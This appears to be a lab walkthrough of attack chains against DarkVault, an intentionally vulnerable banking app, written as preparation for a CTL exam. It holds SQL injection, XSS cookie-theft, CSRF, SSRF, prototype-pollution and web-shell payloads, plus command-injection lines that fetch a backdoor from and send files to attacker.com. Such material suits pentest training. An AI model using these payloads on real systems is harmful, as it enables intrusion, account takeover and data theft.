# Advanced Vulnerability Chains in DarkVault

This document outlines sophisticated vulnerability chains in DarkVault that align with the Cyber Scheme CTL exam requirements. These vulnerabilities focus on advanced exploitation techniques and privilege escalation.

## 1. JWT Token Manipulation and Privilege Escalation Chain

**Objective**: Gain admin access through JWT token manipulation

### Information Gathering
1. Begin by examining the JWT token used for authentication
2. Request the token structure from the information disclosure endpoint:
   ```
   GET /api/get-jwt-info
   ```
3. Analyze the JWT token to understand its structure, including header and payload
4. Look for JWT signature algorithms and validate flags

### JWT Vulnerability Exploitation
1. The token can be decoded and manipulated with tools like jwt.io
2. Discover the hardcoded JWT secret from source code leakage or error messages
3. Edit the payload to change your role to "admin"
4. Sign the token with the discovered secret:
   ```
   darkvault-super-secret-key
   ```
5. Alternatively, try the weaker development key:
   ```
   dev-key
   ```
6. If unable to get the secret, attempt an algorithm confusion attack by changing the algorithm to "none"

### Privilege Escalation Verification
1. Make a request to admin endpoints with your forged token
2. Verify access with:
   ```
   GET /api/admin/profile-updates
   ```
3. The application fails to verify that the token claims match the database values, allowing you to effectively change your role

## 2. Blind Second-Order SQL Injection Chain

**Objective**: Escalate privileges through blind second-order SQL injection

### Detection Phase
1. Login as a regular user
2. Update your profile information with carefully crafted payloads to test for SQL injection
3. Insert a test payload in the location field:
   ```
   London'; SELECT 1; --
   ```
4. No immediate errors will be shown (blind vulnerability)

### Exploitation Phase
1. Insert an update query in the location field:
   ```
   London'; UPDATE users SET role = 'admin' WHERE id = [your_id]; --
   ```
2. The injection won't execute immediately but will be stored in the database
3. When an admin views profile updates through the admin dashboard, your query executes with admin privileges
4. Wait for background processes or admin actions to trigger the second query
5. Verify if your role has been updated to admin
6. Alternatively, you can extract information:
   ```
   London'; SELECT group_concat(username,':',password) FROM users; --
   ```

## 3. Cookie-Based SQL Injection Chain

**Objective**: Extract sensitive information using SQL injection in cookie values

### Discovery
1. Examine the application for endpoints that might use cookie values
2. The user preferences endpoint uses the theme cookie value
3. Set a test cookie to check for SQL injection:
   ```
   theme=dark'--
   ```
4. Make a request to:
   ```
   GET /api/user-preferences
   ```

### Exploitation
1. Determine the number of columns by testing ORDER BY:
   ```
   theme=dark' ORDER BY 1--
   theme=dark' ORDER BY 2--
   theme=dark' ORDER BY 3--
   ```
2. Once you know the column count, use UNION queries to extract data:
   ```
   theme=dark' UNION SELECT 1,2,3--
   ```
3. Extract sensitive data:
   ```
   theme=dark' UNION SELECT username,password,email FROM users--
   ```
4. Since it's a blind vulnerability, extract information one piece at a time:
   ```
   theme=dark' UNION SELECT username,NULL,NULL FROM users WHERE id=1--
   theme=dark' UNION SELECT password,NULL,NULL FROM users WHERE id=1--
   ```

## 4. DOM-Based XSS and Cookie Theft Chain

**Objective**: Execute JavaScript in user browsers to steal session tokens

### DOM-Based XSS Discovery
1. Examine client-side JavaScript for unsafe DOM manipulation
2. The API documentation page manipulates DOM based on the URL hash fragment
3. Test for basic XSS with:
   ```
   /api/documentation#<script>alert(1)</script>
   ```
4. When the page loads, JavaScript inserts the hash value into the innerHTML property without sanitization

### Exploitation
1. Craft a malicious hash value that executes JavaScript:
   ```
   /api/documentation#<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```
2. Send this URL to administrators or wait for them to visit the documentation
3. When they load the page, the JavaScript executes in their browser context
4. Their cookies, including authentication tokens, are sent to your server
5. Use the stolen cookies to impersonate the victim

## 5. Race Condition Exploitation in Banking Transactions

**Objective**: Exploit timing issues to perform multiple transactions with the same funds

### Discovery
1. Identify the quick transfer endpoint:
   ```
   POST /api/quick-transfer
   ```
2. Notice that there's a delay between checking the balance and updating it
3. This creates a race condition where multiple transfers can be initiated before the balance is updated

### Exploitation
1. Create a script that sends multiple transfer requests simultaneously:
   ```javascript
   async function exploitRaceCondition(token, amount, recipient, numRequests = 5) {
     const requests = [];
     for (let i = 0; i < numRequests; i++) {
       requests.push(fetch('/api/quick-transfer', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
           'Authorization': token
         },
         body: JSON.stringify({
           to: recipient,
           amount: amount
         })
       }));
     }
     
     return Promise.all(requests);
   }
   ```
2. Execute the script with a small amount of money that you have in your account
3. The race condition allows multiple transfers to be processed before your balance is updated
4. Result: You can send more money than you actually have

## 6. Prototype Pollution for Authentication Bypass

**Objective**: Alter JavaScript object behavior to bypass authorization checks

### Discovery
1. The application has an endpoint that merges user settings:
   ```
   POST /api/merge-settings
   ```
2. This endpoint uses an unsafe recursive merge function
3. Test for prototype pollution by sending:
   ```json
   {
     "__proto__": {
       "isAdmin": true
     }
   }
   ```

### Exploitation
1. The pollution modifies the behavior of all JavaScript objects in the application
2. The authentication check endpoint uses an empty object in its comparison:
   ```
   GET /api/check-admin
   ```
3. The polluted prototype causes the empty object to have `isAdmin: true`
4. This bypasses authorization checks that rely on object properties
5. Access admin functionality without actually being an admin

## 7. Server-Side Request Forgery (SSRF)

**Objective**: Access internal services and endpoints that are not publicly accessible

### Discovery
1. Identify the proxy endpoint that makes server-side requests:
   ```
   GET /api/proxy?url=https://api.github.com/users
   ```
2. Test if it allows requests to internal services:
   ```
   GET /api/proxy?url=http://localhost:3000/internal/config
   ```
3. Discover that the application runs an internal admin service:
   ```
   GET /api/proxy?url=http://127.0.0.1:3001/admin-dashboard
   ```

### Exploitation
1. Access internal endpoints on the main application:
   ```
   GET /api/proxy?url=http://localhost:3000/internal/config
   ```
   This reveals sensitive information like JWT secrets and admin credentials.

2. Access the internal admin service on port 3001:
   ```
   GET /api/proxy?url=http://127.0.0.1:3001/admin-dashboard
   GET /api/proxy?url=http://127.0.0.1:3001/system-info
   GET /api/proxy?url=http://127.0.0.1:3001/api-keys
   ```
   These reveal additional secrets and system information.

3. Access local files using the file:// protocol:
   ```
   GET /api/proxy?url=file:///etc/passwd
   GET /api/proxy?url=file:///app/server.js
   GET /api/proxy?url=file:///app/bank.db
   ```
   This allows reading sensitive files from the local filesystem.

4. Port scan the local machine:
   ```
   GET /api/proxy?url=http://localhost:8080/
   GET /api/proxy?url=http://localhost:27017/
   ```
   This can identify other services running locally.

5. Leverage the gathered information for further attacks:
   - Use discovered JWT secrets to forge admin tokens
   - Use admin credentials to access protected endpoints
   - Extract database connection details for database attacks

## 8. CSRF Attack Chain

**Objective**: Perform actions on behalf of other users without their knowledge

### Discovery
1. Identify endpoints that don't implement CSRF protection
2. The email update endpoint is vulnerable:
   ```
   POST /api/update-email
   ```
3. No CSRF token is required when submitting the form

### Exploitation
1. Create an HTML page with an auto-submitting form:
   ```html
   <html>
   <body onload="document.forms[0].submit()">
     <form action="http://localhost:3000/api/update-email" method="POST">
       <input type="hidden" name="email" value="attacker@evil.com">
     </form>
   </body>
   </html>
   ```
2. Host this page on a server or send it directly to a victim
3. When they visit while logged in to DarkVault, their email will be changed without their knowledge
4. You can then perform a password reset using the new email address to take over their account

## 9. Modern Web App Attack Chain

**Objective**: Exploit modern web application vulnerabilities to compromise multiple user accounts

### Discovery Phase
1. Examine JavaScript dependencies for known vulnerabilities
2. The application uses an outdated version of lodash (4.17.15) which is vulnerable to prototype pollution
3. Identify the GraphQL endpoint that exposes user data:
   ```
   POST /api/graphql
   ```
4. Use GraphQL introspection to map the complete API schema:
   ```graphql
   {
     __schema {
       types {
         name
         fields {
           name
           type {
             name
             kind
           }
         }
       }
     }
   }
   ```

### Client-Side Prototype Pollution
1. The settings merge functionality is vulnerable to prototype pollution:
   ```
   POST /api/user-settings
   ```
2. Exploit the vulnerability with this payload:
   ```json
   {
     "__proto__": {
       "isAdmin": true,
       "canAccessGraphQL": true
     }
   }
   ```
3. This pollution affects all JavaScript objects in the application
4. Security checks now return true for admin verification

### GraphQL Access and Exploitation
1. With the security bypass, access GraphQL queries that should be restricted:
   ```graphql
   {
     users {
       id
       username
       email
       balance
       role
     }
   }
   ```
2. The GraphQL implementation lacks proper depth limiting and rate controls
3. Use batching to bypass rate limiting with multiple operations in one request:
   ```graphql
   [
     { "query": "{ user(id: 1) { username password } }" },
     { "query": "{ user(id: 2) { username password } }" },
     { "query": "{ user(id: 3) { username password } }" }
   ]
   ```

### Token Extraction and Account Compromise
1. Extract authentication tokens from other users via GraphQL:
   ```graphql
   {
     users {
       id
       username
       sessionData
     }
   }
   ```
2. These tokens can be used to impersonate users
3. Perform horizontal privilege escalation by accessing multiple accounts
4. Exfiltrate sensitive financial data from all accounts:
   ```graphql
   {
     transactions(limit: 1000) {
       id
       from { username }
       to { username }
       amount
       note
     }
   }
   ```

## 10. Command Injection Vulnerability

**Objective**: Execute arbitrary system commands on the server

### Discovery
1. Identify the admin report endpoint that uses server-side command execution:
   ```
   POST /api/admin/report
   ```
2. This endpoint passes unsanitized user input directly to a system command
3. The endpoint requires admin privileges

### Exploitation
1. Gain admin access through other vulnerabilities like JWT manipulation or SQL injection
2. Create a malicious report name with command injection:
   ```json
   {
     "report_name": "sales_report; cat /etc/passwd"
   }
   ```
3. Advanced command injection with output redirection:
   ```json
   {
     "report_name": "quarterly_stats && wget -O /tmp/backdoor.sh http://attacker.com/backdoor.sh && bash /tmp/backdoor.sh"
   }
   ```
4. Chain multiple commands using semicolons, double ampersands, or pipes:
   ```
   legitimate_name; whoami
   legitimate_name && cat /etc/shadow
   legitimate_name | grep password
   ```
5. Data exfiltration via network commands:
   ```
   legitimate_name; curl -d "$(cat /app/config.json)" https://attacker.com/collect
   ```

### Impact
1. Execute arbitrary code with the application's privileges
2. Read sensitive system files
3. Create backdoors for persistent access
4. Pivot to other systems on the network

## 11. Insecure File Upload Vulnerability

**Objective**: Upload malicious files and achieve remote code execution

### Discovery
1. Examine the file upload endpoint:
   ```
   POST /api/upload
   ```
2. Test for security controls and headers that might influence upload behavior
3. Notice that special headers can modify upload behavior:
   ```
   X-Upload-Path: custom directory path
   X-Use-Original-Filename: true
   X-Skip-Validation: true
   ```

### Exploitation Methods

#### Method 1: Custom Headers
1. **Path traversal in upload location**:
   ```
   # Using path traversal to write to a sensitive location
   X-Upload-Path: ../public/images
   ```
2. **Upload a web shell with original filename**:
   ```
   # Set these headers:
   X-Use-Original-Filename: true
   X-Skip-Validation: true
   
   # Upload a PHP file with content:
   <?php
   if(isset($_REQUEST['cmd'])){
     echo "<pre>";
     system($_REQUEST['cmd']);
     echo "</pre>";
   }
   ?>
   ```

#### Method 2: MIME Type Spoofing
1. Upload a PHP file but set its content type to an allowed image type:
   ```
   # Modify Content-Type in the request
   Content-Type: image/png
   
   # File: shell.php with content:
   <?php system($_GET['cmd']); ?>
   ```
2. The server trusts the Content-Type header without properly validating file contents

#### Method 3: Double Extension Bypass
1. Use multiple extensions where the server only checks the last one:
   ```
   # File: shell.php.png with content:
   <?php system($_GET['cmd']); ?>
   ```
2. The server sees it as a PNG file, but if the server is misconfigured, it might execute it as PHP

#### Method 4: Null Byte Injection
1. Use null byte character to truncate the filename when processed:
   ```
   # File: shell.php%00.png with content:
   <?php system($_GET['cmd']); ?>
   ```
2. Some systems might process this as shell.php, ignoring everything after the null byte

#### Method 5: Form Parameter Bypass
1. Add an explicit parameter to bypass validation:
   ```
   # Add this to your form data:
   allowFile: true
   
   # Then upload your shell.php file
   ```
2. This tricks the server into accepting the file regardless of its type

### Accessing the shell
1. If you used path traversal to the public directory, access:
   ```
   GET /shell.php?cmd=whoami
   ```
2. For files in other directories, you may need to chain this with other vulnerabilities like SSRF to execute the uploaded code

### Pentester Discovery Techniques
1. **Content-Type Fuzzing**: Test different MIME types with the same file
2. **Extension Fuzzing**: Try various file extensions and combinations
3. **Parameter Discovery**: Test common parameters like `allow`, `bypass`, `debug`
4. **Error Analysis**: Look for verbose error messages that reveal accepted formats
5. **Incremental Testing**: Start with legitimate files, then gradually introduce malicious content
6. **Response Differential**: Compare responses between valid and invalid uploads to identify validation patterns

## Advanced Enumeration Techniques

The CTL exam requires sophisticated enumeration techniques. Here are approaches for DarkVault:

### API Endpoint Discovery
1. Map all endpoints using a combination of client-side code analysis, network traffic monitoring, and fuzzing
2. Look for hidden or undocumented endpoints in JavaScript files
3. Use the `/api/documentation` endpoint to discover API structure

### Authentication Mechanism Analysis
1. Examine the JWT token structure and signing methods
2. Test for weak secrets and algorithm confusion
3. Look for secondary authentication methods and backdoor access points

### Database Schema Enumeration
1. Use SQL injection to extract database schema:
   ```
   " UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'--
   ```
2. Map relationships between tables to understand data flow
3. Identify potentially sensitive tables for targeted extraction

### Role and Permission Mapping
1. Map different user roles and their permissions
2. Identify endpoints with insufficient access control
3. Test horizontal and vertical privilege escalation paths

## Conclusion

These advanced vulnerability chains align with the Cyber Scheme CTL exam requirements, providing practical experience with:
- Advanced injection vulnerabilities (SQL injection, XSS)
- Authentication and authorization bypass techniques
- Modern web vulnerabilities (prototype pollution, SSRF)
- Race conditions and other timing-based attacks
- Multi-step exploitation chains

Studying and exploiting these vulnerabilities will prepare you for the challenges found in the CTL exam. 